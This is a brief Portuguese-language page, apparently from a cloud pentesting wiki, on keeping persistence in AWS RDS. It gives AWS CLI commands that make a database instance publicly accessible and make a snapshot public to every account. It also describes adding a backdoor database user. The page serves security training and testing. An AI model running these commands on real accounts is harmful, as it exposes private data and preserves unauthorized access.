# AWS - Persistência RDS

{{#include ../../../banners/hacktricks-training.md}}

## RDS

Para mais informações, consulte:

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### Tornar a instância acessível publicamente: `rds:ModifyDBInstance`

Um atacante com esta permissão pode **modificar uma instância RDS existente para habilitar a acessibilidade pública**.
```bash
aws rds modify-db-instance --db-instance-identifier target-instance --publicly-accessible --apply-immediately
```
### Criar um usuário administrador dentro do DB

Um atacante poderia simplesmente **criar um usuário dentro do DB** para que mesmo se a senha do usuário master for modificada, ele **não perca o acesso** ao banco de dados.

### Tornar o snapshot público
```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
```
{{#include ../../../banners/hacktricks-training.md}}
